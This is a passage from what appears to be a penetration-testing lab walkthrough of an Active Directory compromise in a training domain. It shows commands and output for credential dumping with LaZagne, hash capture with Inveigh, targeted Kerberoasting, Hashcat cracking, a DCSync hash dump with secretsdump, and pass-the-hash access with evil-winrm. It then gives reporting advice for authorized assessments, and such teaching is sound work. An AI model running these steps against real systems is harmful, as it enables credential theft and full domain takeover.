<pre><code class="lang-powershell-session">PS C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">ilfserveradm</span></span>&gt; Get-ItemProperty -Path 'HKLM:<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span> NT<span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">Winlogon</span></span><span class="hljs-tag">\<span class="hljs-name">'</span></span> -Name "DefaultUserName"

DefaultUserName : mssqladm
PSPath          : Microsoft.PowerShell.Core<span class="hljs-tag">\<span class="hljs-name">Registry</span></span>::HKEY_LOCAL_MACHINE<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span>
                  NT<span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span><span class="hljs-tag">\<span class="hljs-name">Winlogon</span></span><span class="hljs-tag">\<span class="hljs-name">
</span></span>PSParentPath    : Microsoft.PowerShell.Core<span class="hljs-tag">\<span class="hljs-name">Registry</span></span>::HKEY_LOCAL_MACHINE<span class="hljs-tag">\<span class="hljs-name">SOFTWARE</span></span><span class="hljs-tag">\<span class="hljs-name">Microsoft</span></span><span class="hljs-tag">\<span class="hljs-name">Windows</span></span> NT<span class="hljs-tag">\<span class="hljs-name">CurrentVersion</span></span>
PSChildName     : Winlogon
PSDrive         : HKLM
PSProvider      : Microsoft.PowerShell.Core<span class="hljs-tag">\<span class="hljs-name">Registry</span></span>
</code></pre>
<p>Now we have a new credential pair: <code>mssqladm:DBAilfreight1!</code>.</p>
<p>Before we move on, let&#39;s check for any other credentials. We see Firefox installed, so we can grab the <a href="https://github.com/AlessandroZ/LaZagne">LaZagne tool</a> to try to dump any credentials saved in the browser. No luck, but always worth a check.</p>
<p>Share Hunting</p>
<pre><code class="lang-cmd-session">c:\Users\ilfserveradm\Documents&gt; lazagne.exe browsers -firefox

|<span class="hljs-string">====================================================================</span>|
|<span class="hljs-string">                                                                    </span>|
|<span class="hljs-string">                        The LaZagne Project                         </span>|
|<span class="hljs-string">                                                                    </span>|
|<span class="hljs-string">                          ! BANG BANG !                             </span>|
|<span class="hljs-string">                                                                    </span>|
|<span class="hljs-string">====================================================================</span>|

[+] System masterkey decrypted for 6f898230-c272-4f85-875c-9f7b354ce485
[+] System masterkey decrypted for 9ccbb5e8-66c9-4210-a46c-a72e8f750734
[+] System masterkey decrypted for 08ed962e-44d9-4e2c-9985-392b699c25ae
[+] System masterkey decrypted for d4bfcc8b-5eec-485d-8adb-9ed4ae5656d6

[+] 0 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.29700016975
</code></pre>
<p>It&#39;s also worth running <a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a> once we have local admin on a host to see if we can obtain password hashes for any users.</p>
<p>Share Hunting</p>
<pre><code class="lang-powershell-session">PS C:\Users\ilfserveradm\Documents&gt; Import-Module .\Inveigh.ps1
PS C:\Users\ilfserveradm\Documents&gt; Invoke-Inveigh -ConsoleOutput Y -FileOutput Y

<span class="hljs-string">[*]</span> Inveigh <span class="hljs-number">1</span>.<span class="hljs-number">506</span> started at <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-22T15:<span class="hljs-number">03</span>:<span class="hljs-number">32</span>
<span class="hljs-string">[+]</span> Elevated Privilege Mode = Enabled
<span class="hljs-string">[+]</span> Primary IP Address = <span class="hljs-number">172.16.8.50</span>
<span class="hljs-string">[+]</span> Spoofer IP Address = <span class="hljs-number">172.16.8.50</span>
<span class="hljs-string">[+]</span> ADIDNS Spoofer = Disabled
<span class="hljs-string">[+]</span> DNS Spoofer = Enabled
<span class="hljs-string">[+]</span> DNS TTL = <span class="hljs-number">30</span> Seconds
<span class="hljs-string">[+]</span> LLMNR Spoofer = Enabled
<span class="hljs-string">[+]</span> LLMNR TTL = <span class="hljs-number">30</span> Seconds
<span class="hljs-string">[+]</span> mDNS Spoofer = Disabled
<span class="hljs-string">[+]</span> NBNS Spoofer = Disabled
<span class="hljs-string">[+]</span> SMB Capture = Enabled
<span class="hljs-string">[+]</span> HTTP Capture = Enabled
<span class="hljs-string">[+]</span> HTTPS Capture = Disabled
<span class="hljs-string">[+]</span> HTTP/HTTPS Authentication = NTLM
<span class="hljs-string">[+]</span> WPAD Authentication = NTLM
<span class="hljs-string">[+]</span> WPAD NTLM Authentication Ignore List = Firefox
<span class="hljs-string">[+]</span> WPAD Response = Enabled
<span class="hljs-string">[+]</span> Kerberos TGT Capture = Disabled
<span class="hljs-string">[+]</span> Machine Account Capture = Disabled
<span class="hljs-string">[+]</span> Console Output = Full
<span class="hljs-string">[+]</span> File Output = Enabled
<span class="hljs-string">[+]</span> Output Directory = C:\Users\ilfserveradm\Documents
WARNING: <span class="hljs-string">[!]</span> Run Stop-Inveigh to stop
<span class="hljs-string">[*]</span> Press any key to stop console output
<span class="hljs-string">[+]</span> <span class="hljs-string">[2022-06-22T15:04:05]</span> TCP(<span class="hljs-number">445</span>) SYN packet detected from <span class="hljs-number">172.16.8.20:55623</span>
<span class="hljs-string">[+]</span> <span class="hljs-string">[2022-06-22T15:04:05]</span> SMB(<span class="hljs-number">445</span>) negotiation request detected from <span class="hljs-number">172.16.8.20:55623</span>
<span class="hljs-string">[+]</span> <span class="hljs-string">[2022-06-22T15:04:05]</span> Domain mapping added for INLANEFREIGHT to INLANEFREIGHT.LOCAL
<span class="hljs-string">[+]</span> <span class="hljs-string">[2022-06-22T15:04:05]</span> SMB(<span class="hljs-number">445</span>) NTLM challenge 5EB0B310E7B8BA04 sent to <span class="hljs-number">172.16.8.20:55623</span>
<span class="hljs-string">[+]</span> <span class="hljs-string">[2022-06-22T15:04:05]</span> SMB(<span class="hljs-number">445</span>) NTLMv2 captured for ACADEMY-AEN-DEV\mpalledorous from <span class="hljs-number">172.16.8.20</span>(ACADEMY-AEN-DEV):<span class="hljs-number">55623</span>:
mpalledorous::ACADEMY-AEN-DEV:5EB0B310E7B8BA04:&lt;SNIP&gt;
</code></pre>
<hr>
<h3 id="closing-in">Closing In</h3>
<p>We&#39;ve now enumerated the domain inside and out, moved laterally, and pillaged what we could find on the target hosts. At this point, we have credentials for the <code>mssqladm</code> user and can continue hunting a path to domain compromise.</p>
<h2 id="active-directory-compromise">Active Directory Compromise</h2>
<hr>
<p>To recap, we dug through the Active Directory environment and obtained the following credential pair:</p>
<p><code>mssqladm:DBAilfreight1!</code></p>
<p>Digging into the BloodHound data we see that we have <code>GenericWrite</code> over the <code>ttimmons</code> user. Using this we can set a fake SPN on the <code>ttimmons account</code> and perform a targeted Kerberoasting attack. If this user is using a weak password then we can crack it and proceed onwards.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/ttimmons.png" alt="text"></p>
<p>Let&#39;s go back to the <code>DEV01</code> machine where we had loaded PowerView. We can create a PSCredential object to be able to run commands as the <code>mssqladm</code> user without having to RDP again.</p>
<p>Active Directory Compromise</p>
<pre><code class="lang-powershell-session">PS C:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; <span class="hljs-variable">$SecPassword</span> = ConvertTo-SecureString <span class="hljs-string">'DBAilfreight1!'</span> -AsPlainText -Force
PS C:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; <span class="hljs-variable">$Cred</span> = New-Object System<span class="hljs-selector-class">.Management</span><span class="hljs-selector-class">.Automation</span><span class="hljs-selector-class">.PSCredential</span>(<span class="hljs-string">'INLANEFREIGHT\mssqladm'</span>, <span class="hljs-variable">$SecPassword</span>)
</code></pre>
<p>Next we&#39;ll use <code>Set-DomainObject</code> to set a fake SPN on the target account. We&#39;ll create an SPN named <code>acmetesting/LEGIT</code> which we&#39;ll of course delete later and note in the appendices of our report.</p>
<p>Active Directory Compromise</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; <span class="hljs-keyword">Set</span>-DomainObject -credential $Cred -<span class="hljs-keyword">Identity</span> ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -<span class="hljs-keyword">Verbose</span>

VERBOSE: [<span class="hljs-keyword">Get</span>-Domain] <span class="hljs-keyword">Using</span> alternate credentials for <span class="hljs-keyword">Get</span>-Domain
VERBOSE: [<span class="hljs-keyword">Get</span>-Domain] Extracted domain <span class="hljs-string">'INLANEFREIGHT'</span> from -Credential
VERBOSE: [<span class="hljs-keyword">Get</span>-DomainSearcher] search base: LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [<span class="hljs-keyword">Get</span>-DomainSearcher] <span class="hljs-keyword">Using</span> alternate credentials for LDAP connection
VERBOSE: [<span class="hljs-keyword">Get</span>-DomainObject] <span class="hljs-keyword">Get</span>-DomainObject filter string:
(&amp;(|(|(samAccountName=ttimmons)(name=ttimmons)(displayname=ttimmons))))
VERBOSE: [<span class="hljs-keyword">Set</span>-DomainObject] <span class="hljs-keyword">Setting</span> <span class="hljs-string">'serviceprincipalname'</span> to <span class="hljs-string">'acmetesting/LEGIT'</span> for object <span class="hljs-string">'ttimmons</span>
</code></pre>
<p>Next we can go back to our attack host and use <code>GetUserSPNs.py</code> to perform a targeted Keberoasting attack.</p>
<p>Active Directory Compromise</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains GetUserSPNs.py -dc-ip <span class="hljs-number">172.16</span>.<span class="hljs-number">8.3</span> INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons

ProxyChains-<span class="hljs-number">3.1</span> (http://proxychains.sf.net)
Impacket v0.<span class="hljs-number">9.24</span>.dev1+<span class="hljs-number">20210922.102044</span>.c7bc76f8 - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation

Password:
|S-chain|-<span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.3</span>:<span class="hljs-number">389</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-OK
ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  --------  --------  --------------------------  ---------  ----------
acmetesting/LEGIT     ttimmons            <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">01</span> <span class="hljs-number">14</span>:<span class="hljs-number">32</span>:<span class="hljs-number">18.194423</span>  <span class="hljs-variable">&lt;never&gt;</span>               



|S-chain|-<span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.3</span>:<span class="hljs-number">88</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-OK
|S-chain|-<span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.3</span>:<span class="hljs-number">88</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-OK
|S-chain|-<span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-<span class="hljs-number">172.16</span>.<span class="hljs-number">8.3</span>:<span class="hljs-number">88</span>-<span class="hljs-variable">&lt;&gt;</span><span class="hljs-variable">&lt;&gt;</span>-OK
<span class="hljs-variable">$krb5tgs</span><span class="hljs-variable">$23</span>$*ttimmons<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL<span class="hljs-variable">$INLANEFREIGHT</span>.LOCAL/ttimmons*<span class="hljs-variable">$6c391145c0c6430a1025df35c3e674c4</span><span class="hljs-variable">$2d66d2dc6622c6af0a9afd0b1934220363f74726dcaa38ad49ec37b54b0dfe4e0ad42a443cc825fd49bea230748e1467b53be757b432a8d3fbc7ba1817d9bac69159ff86381fc4ae266210ee228c8f9de4c103d6d3a16039ea5f41cd2483a77e0e6486ea7cf78539b27aa26f8b245a611a52c0de9b11abe36a02ad5f8e9d5ee9b821db4834c0168d3426ea57acd4f82cdd0edd64a649df01cc9db28fea597c2910ffd67146ab571a9b19ddea34a2b991382394bd36efa5be9da947e44f0ac040df2a55ebd791a08fbfe25634483624cca1d4dadeab9327e0fe328ab9ae128d75d4c9908a3878c03ab20821edecca73df6066d0ead15e9b2c97c417de1f1cb2b6fe0890388a1738f420e69f7bb07b414e860774a414452ba613d62cc516a5e5fff58567573ad721992c6e036553f250372d053148bf4d88a</span><span class="hljs-variable">&lt;SNIP&gt;</span>
</code></pre>
<p>Next we&#39;ll fire up Hashcat and see if the user is using a weak password.</p>
<p>Active Directory Compromise</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ hashcat -m <span class="hljs-number">13100</span> ttimmons_tgs /usr/share/wordlists/rockyou.txt

hashcat (v6<span class="hljs-number">.1</span><span class="hljs-number">.1</span>) starting...

&lt;SNIP&gt;

$krb5tgs$<span class="hljs-number">23</span>$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$$<span class="hljs-number">6</span>c391145c0c6430a1025df35c3e674c4$<span class="hljs-number">2</span>d66d2dc6622c6af0a9afd0b1934220363f74726dcaa38ad49ec37b54b0dfe4e0ad42a443cc825fd49bea230748e1467b53be757b432a8d3fbc7ba1817d9bac69159ff86381fc4ae266210ee228c8f9de4c103d6d3a16039ea5f41cd2483a77e0e6486ea7cf78539b27aa26f8b245a611a52c0de9b11abe36a02ad5f8e9d5ee9b821db4834c0168d3426ea57acd4f82cdd0edd64a649df01cc9db28fea597c2910ffd67146ab571a9b19ddea34a2b991382394bd36efa5be9da947e44f0ac040df2a55ebd791a08fbfe25634483624cca1d4dadeab9327e0fe328ab9ae128d75d4c9908a3878c03ab20821edecca73df6066d0ead15e9b2c97c417de1f1cb2b6fe0890388a1738f420e69f7bb07b414e860774a414452ba613d62cc516a5e5fff58567573ad721992c6e036553f250372d053148bf4d88a&lt;SNIP&gt;:&lt;PASSWORD REDACTED&gt;

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, TGS-REP
Hash.Target......: $krb5tgs$<span class="hljs-number">23</span>$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFRE..<span class="hljs-number">.6e6976</span>
Time.Started.....: Wed Jun <span class="hljs-number">22</span> <span class="hljs-number">16</span>:<span class="hljs-number">32</span>:<span class="hljs-number">27</span> <span class="hljs-number">2022</span> (<span class="hljs-number">22</span> secs)
Time.Estimated...: Wed Jun <span class="hljs-number">22</span> <span class="hljs-number">16</span>:<span class="hljs-number">32</span>:<span class="hljs-number">49</span> <span class="hljs-number">2022</span> (<span class="hljs-number">0</span> secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%)
Speed.#<span class="hljs-number">1.</span>........:   <span class="hljs-number">485.7</span> kH/s (<span class="hljs-number">2.50</span>ms) @ Accel:<span class="hljs-number">16</span> Loops:<span class="hljs-number">1</span> Thr:<span class="hljs-number">64</span> Vec:<span class="hljs-number">8</span>
Recovered........: <span class="hljs-number">1</span>/<span class="hljs-number">1</span> (<span class="hljs-number">100.00</span>%) Digests
Progress.........: <span class="hljs-number">10678272</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">74.44</span>%)
Rejected.........: <span class="hljs-number">0</span>/<span class="hljs-number">10678272</span> (<span class="hljs-number">0.00</span>%)
Restore.Point....: <span class="hljs-number">10672128</span>/<span class="hljs-number">14344385</span> (<span class="hljs-number">74.40</span>%)
Restore.Sub.#<span class="hljs-number">1.</span>..: Salt:<span class="hljs-number">0</span> Amplifier:<span class="hljs-number">0</span><span class="hljs-number">-1</span> Iteration:<span class="hljs-number">0</span><span class="hljs-number">-1</span>
Candidates.#<span class="hljs-number">1.</span>...: Rock4ever! -&gt; Redeye2

Started: Wed Jun <span class="hljs-number">22</span> <span class="hljs-number">16</span>:<span class="hljs-number">32</span>:<span class="hljs-number">24</span> <span class="hljs-number">2022</span>
Stopped: Wed Jun <span class="hljs-number">22</span> <span class="hljs-number">16</span>:<span class="hljs-number">32</span>:<span class="hljs-number">51</span> <span class="hljs-number">2022</span>
</code></pre>
<p>They are! Now we have yet another credential pair, time for the ttimmons user. Let&#39;s check and see what type of access this user has. Looking in BloodHound again we see that we have <code>GenericAll</code> over the <code>SERVER ADMINS</code> group.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/ttimmons\_server\_admins.png" alt="text"></p>
<p>Looking a bit further we see that the <code>SERVER ADMINS</code> group has the ability to perform the DCSync attack to obtain NTLM password hashes for any users in the domain.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/dcsync.png" alt="text"></p>
<p>We use abuse this by first adding the <code>ttimmons</code> user to the group. First we&#39;ll need to create another PSCredential object.</p>
<p>Active Directory Compromise</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; PS C:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; <span class="hljs-variable">$timpass</span> = ConvertTo-SecureString <span class="hljs-string">'&lt;PASSWORD REDACTED&gt;'</span> -AsPlainText -Force
PS C:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; <span class="hljs-variable">$timcreds</span> = New-Object System<span class="hljs-selector-class">.Management</span><span class="hljs-selector-class">.Automation</span><span class="hljs-selector-class">.PSCredential</span>(<span class="hljs-string">'INLANEFREIGHT\ttimmons'</span>, <span class="hljs-variable">$timpass</span>)
</code></pre>
<p>Once this is done, we can add the user to the target group and inherit the DCSync privileges.</p>
<p>Active Directory Compromise</p>
<pre><code class="lang-powershell-session">PS C:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; $<span class="hljs-keyword">group</span> <span class="hljs-title">= Convert-NameToSid</span> <span class="hljs-string">"Server Admins"</span>
PS C:\DotNetNuke\Portals\<span class="hljs-number">0</span>&gt; Add-DomainGroupMember -Identity $<span class="hljs-keyword">group</span> <span class="hljs-title">-Members</span> 'ttimmons' -Credential $timcreds -verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'ttimmons' to <span class="hljs-keyword">group</span> <span class="hljs-title">'S-1-5-21-2814148634-3729814499-1637837074-1622</span>
</code></pre>
<p>Finally, we can use Secretsdump to DCSync all NTLM password hashes from the Domain Controller.</p>
<p>Active Directory Compromise</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains secretsdump.py ttimmons@<span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span> -just-dc-ntlm

ProxyChains<span class="hljs-number">-3.1</span> (http:<span class="hljs-comment">//proxychains.sf.net)</span>
Impacket v0<span class="hljs-number">.9</span><span class="hljs-number">.24</span>.dev1+<span class="hljs-number">20210922.102044</span>.c7bc76f8 - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation
<span class="hljs-symbol">
Password:</span>
|S-chain|-<span class="hljs-params">&lt;&gt;</span><span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-params">&lt;&gt;</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">445</span>-<span class="hljs-params">&lt;&gt;</span><span class="hljs-params">&lt;&gt;</span>-OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
|S-chain|-<span class="hljs-params">&lt;&gt;</span><span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-params">&lt;&gt;</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">135</span>-<span class="hljs-params">&lt;&gt;</span><span class="hljs-params">&lt;&gt;</span>-OK
|S-chain|-<span class="hljs-params">&lt;&gt;</span><span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-params">&lt;&gt;</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">49676</span>-<span class="hljs-params">&lt;&gt;</span><span class="hljs-params">&lt;&gt;</span>-OK
<span class="hljs-symbol">Administrator:</span><span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-symbol">fd1f7e55xxxxxxxxxx787ddbb6e6afa2::</span>:
<span class="hljs-symbol">Guest:</span><span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">31</span><span class="hljs-symbol">d6cfe0d16ae931b73c59d7e0c089c0::</span>:
<span class="hljs-symbol">krbtgt:</span><span class="hljs-number">502</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-symbol">b9362dfa5abf924b0d172b8c49ab58ac::</span>:
inlanefreight.local\avazquez:<span class="hljs-number">1716</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">762</span><span class="hljs-symbol">cbc5ea2edfca03767427b2f2a909f::</span>:
inlanefreight.local\pfalcon:<span class="hljs-number">1717</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-symbol">f8e656de86b8b13244e7c879d8177539::</span>:
inlanefreight.local\fanthony:<span class="hljs-number">1718</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">9827f</span>62<span class="hljs-symbol">cf27fe221b4e89f7519a2092a::</span>:
inlanefreight.local\wdillard:<span class="hljs-number">1719</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">69</span><span class="hljs-symbol">ada25bbb693f9a85cd5f176948b0d5::</span>:

<span class="hljs-params">&lt;SNIP&gt;</span>
</code></pre>
<hr>
<h3 id="next-steps">Next Steps</h3>
<p>After making sure to document all of our steps we could perform a number of actions, many of which are detailed in the next section. Its definitely a good idea to dump the entire NTDS database and perform offline password cracking to give the client an idea of their overall password strength and other metrics. You could also show evidence of being able to authenticate to a Domain Controller and running a few commands as this may drive the point home more than seeing secretsdump output, which they may not be familiar with. Connecting to the Domain Controller via RDP and including a screenshot to the report showing a console open with the results of the <code>hostname</code>, <code>whoami</code>, and <code>ipconfig /all</code> commands can be a great visual. There is also a lot of extra value we can add after Domain Admin by performing additional audit steps of AD, attacking domain and forest trusts (if in scope) and, finally, testing the client&#39;s alerting by either creating a new Domain Admin and Enterprise Admin or adding an account we control into each of these groups. Ideally they are monitoring these highly privileged groups and will catch this and either manually, or, even better, have something automated in place to remove the accounts from the groups. If you do this definitely include this action in the report as a configuration change in the appendices and also give the client kudos if they do detect it and action it appropriately. Giving credit for the good things you see in the network/the client does is important and goes a long way towards building good will.</p>
<h2 id="post-exploitation">Post-Exploitation</h2>
<hr>
<p>Once we&#39;ve compromised the domain, depending on the assessment type, our work is not over. There are many things we can do to add additional value to our clients. If the goal of the assessment was to reach Domain Admin and nothing further, then we are done and should make sure we have all of our command/log output, scan data, and screenshots and continue drafting the report. If the assessment was goal focused (i.e., gain access to a specific database) we should continue working towards that goal. Domain Admin rights may be just the start as there could be other networks, domains, or forests in play that we will need to find our way into. If the assessment is more open ended and the client asked us to demonstrate as much impact as possible there are quite a few things we can do to add value and help them improve their security posture.</p>
<hr>
<h3 id="domain-password-analysis-cracking-ntds">Domain Password Analysis - Cracking NTDS</h3>
<p>After we have dumped the NTDS database we can perform offline password cracking with Hashcat. Once we&#39;ve exhausted all possible rules and wordlists on our cracking rig we should use a tool such as <a href="https://github.com/clr2of8/DPAT">DPAT</a> to perform a domain password analysis. This can nicely compliment findings such as <code>Weak Active Directory Passwords Allowed</code>, which we noted down after a successful password spraying attack earlier. This analysis can help drive the point home and can be a power visual. Our analysis can be included in the appendices of the report with metrics such as:</p>
<ul>
<li>Number of password hashes obtained</li>
<li>Number of password hashes cracked</li>
<li>Percent of password hashes cracked</li>
<li>Top 10 passwords</li>
<li>Password length breakdown</li>
<li>Number of Domain Admin passwords cracked</li>
<li>Number of Enterprise Admin passwords cracked</li>
</ul>
<hr>
<h3 id="active-directory-security-audit">Active Directory Security Audit</h3>
<p>As discussed in the <code>Active Directory Enumeration &amp; Attacks</code> module, we can provide extra value to our clients by digging deeper into Active Directory and finding best practice recommendations and delivering them in the appendices of our report. The tool <a href="https://www.pingcastle.com/">PingCastle</a> is excellent for auditing the overall security posture of the domain and we can pull many different items from the report it generates to give our client recommendations on additional ways they can harden their AD environment. This type of &quot;above and beyond the call of duty&quot; work can build good will with our customers and lead to both repeat business and referrals. Its a great way to set ourselves apart and demonstrate the risks that plague AD environments and show our deep understanding of the client&#39;s network.</p>
<hr>
<h3 id="hunting-for-sensitive-data-hosts">Hunting for Sensitive Data/Hosts</h3>
<p>Once we&#39;ve gained access to the Domain Controller we can likely access most any resources in the domain. If we want to demonstrate impact for our clients a good spot to start is going back to the file shares to see what other types of data we can now view. As discussed in the <code>Documentation &amp; Reporting</code> module, we should make sure to just take screenshots showing a file listing if we find a particularly sensitive file share, and not open individual files and take screenshots or remove any files from the network.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ proxychains evil-winrm -i <span class="hljs-number">172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span> -u administrator -H fd1f7e556xxxxxxxxxxxddbb6e6afa2

ProxyChains<span class="hljs-number">-3.1</span> (http:<span class="hljs-comment">//proxychains.sf.net)</span>

<span class="hljs-params">&lt;SNIP&gt;</span>

Evil-WinRM* PS C:\Users\Administrator\desktop&gt; cd c:\

|S-chain|-<span class="hljs-params">&lt;&gt;</span><span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-params">&lt;&gt;</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">5985</span>-<span class="hljs-params">&lt;&gt;</span><span class="hljs-params">&lt;&gt;</span>-OK
|S-chain|-<span class="hljs-params">&lt;&gt;</span><span class="hljs-number">-127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8083</span>-<span class="hljs-params">&lt;&gt;</span><span class="hljs-params">&lt;&gt;</span><span class="hljs-number">-172.16</span><span class="hljs-number">.8</span><span class="hljs-number">.3</span>:<span class="hljs-number">5985</span>-<span class="hljs-params">&lt;&gt;</span><span class="hljs-params">&lt;&gt;</span>-OK

*Evil-WinRM* PS C:\&gt; dir
<span class="hljs-symbol">
    Directory:</span> C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         <span class="hljs-number">6</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">11</span>:<span class="hljs-number">34</span> AM                Department Shares
d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">12</span> AM                PerfLogs
d-r---       <span class="hljs-number">12</span>/<span class="hljs-number">14</span>/<span class="hljs-number">2020</span>   <span class="hljs-number">6</span>:<span class="hljs-number">43</span> PM                Program Files
d-----        <span class="hljs-number">9</span>/<span class="hljs-number">15</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">12</span>:<span class="hljs-number">21</span> AM                Program Files (x86)
d-r---         <span class="hljs-number">6</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">11</span>:<span class="hljs-number">07</span> AM                Users
d-----         <span class="hljs-number">6</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span>  <span class="hljs-number">11</span>:<span class="hljs-number">10</span> AM                Windows
</code></pre>
<p>Let&#39;s go back to the <code>Department Shares</code> share and see what else we can find.</p>
<p>Post-Exploitation</p>
<pre><code class="lang-shell-session"><span class="hljs-comment">*Evil</span><span class="hljs-literal">-</span><span class="hljs-comment">WinRM*</span> <span class="hljs-comment">PS</span> <span class="hljs-comment">C:\Department</span> <span class="hljs-comment">Shares</span>&gt; <span class="hljs-comment">dir</span>

